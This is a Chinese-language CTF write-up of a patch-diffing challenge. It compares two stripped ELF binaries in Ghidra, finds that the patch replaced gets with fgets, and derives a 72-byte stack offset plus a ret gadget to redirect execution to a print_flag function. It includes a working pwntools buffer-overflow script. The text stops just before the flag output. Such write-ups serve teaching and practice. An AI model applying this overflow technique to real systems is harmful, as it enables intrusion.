# 系统层漏洞利用与逆向分析-安全补丁对比分析-G1 WriteUp

题目提供了两个二进制文件 `challenge_v1.elf` 和 `challenge_v2.elf`，分别是同一程序的早期版本和修复版本，靶机运行的是存在漏洞的早期版本 `challenge_v1`。通过 `file` 命令确认两者均为 x86-64 架构的动态链接 ELF 可执行文件，已被 strip 去除符号信息。

将两个二进制文件导入 Ghidra 并完成自动分析后，首先对比两个版本的导入函数表。观察到 v1 导入了 `gets` 函数，而 v2 中该导入已被移除。`gets` 是一个众所周知的危险函数，它从标准输入读取字符串时不检查目标缓冲区的长度，极易导致栈缓冲区溢出，这是两个版本之间最关键的差异。

v2 的主函数中调用方式也相应变为 `FUN_0040126b(local_48, 0x40)`，即传入了 64 字节的长度限制。这就是安全补丁的全部内容：将 `gets` 替换为带长度约束的 `fgets`，从根本上消除了缓冲区溢出的可能。

明确了漏洞点之后，下一步是确定利用路径。程序中已经存在一个 `print_flag` 函数（地址 `0x004011d6`），它打开 `/flag` 文件并将内容写到标准输出后退出。

![image.png](https://k13in-images.oss-cn-wuhan-lr.aliyuncs.com/20260824145505383.png)

因此利用目标很明确：通过 `gets` 的栈溢出覆盖 `main` 函数的返回地址，使其跳转到 `print_flag`。

为确定精确的溢出偏移量，反汇编 main 函数查看栈布局。函数序言为 `PUSH RBP; MOV RBP,RSP; ADD RSP,-0x80`，分配了 0x80 字节的栈空间。调用 `gets` 前的指令为 `LEA RAX,[RBP + -0x40]; MOV RDI,RAX; CALL gets`，说明 username 缓冲区起始于 `RBP - 0x40`。从缓冲区起始到保存的 RBP 需要填充 0x40（64）字节，再加 8 字节覆盖 saved RBP，共计 72 字节即可到达返回地址的位置。由于 x86-64 的 System V ABI 要求在 CALL 指令执行时 RSP 必须 16 字节对齐，直接跳转到 `print_flag` 会因未对齐而在内部的栈操作中触发段错误，因此需要在目标地址前插入一个 `ret` gadget（地址 `0x0040101a`）来调整栈对齐。

最终的 pwntools 利用脚本如下：

```python
from pwn import *

r = remote("ip", port)

print_flag = 0x004011d6
ret_gadget = 0x0040101a

payload  = b"A" * (0x40 + 8)
payload += p64(ret_gadget)
payload += p64(print_flag)

r.sendlineafter(b"Username: ", payload)
r.sendlineafter(b"Password: ", b"foo")
print(r.recvall(timeout=3).decode())
r.close()
```

payload 的结构为：64 字节填充覆盖 username 缓冲区，8 字节覆盖 saved RBP，然后是 `ret` gadget 的地址用于栈对齐，最后是 `print_flag` 函数的地址。程序在 Username 处接收溢出数据后，Password 随意输入即可，密码校验失败并不影响返回地址已被覆盖的事实。当 main 函数执行 `ret` 指令时，控制流跳转到 `ret` gadget 再滑入 `print_flag`，成功读取并输出 flag：
